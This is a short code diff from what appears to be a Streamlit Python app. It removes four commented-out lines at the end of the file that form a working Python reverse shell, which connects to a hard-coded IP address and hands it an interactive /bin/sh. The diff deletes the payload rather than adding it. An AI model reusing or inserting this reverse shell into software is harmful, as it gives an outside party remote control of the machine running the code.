@@ -23,7 +23,3 @@ except Exception as e:
     rdata = e
 
 st.code(f"{rdata}", language="properties", line_numbers=True)
-
-# import socket,subprocess,os
-# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-# s.connect(("54.207.37.3",12418));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
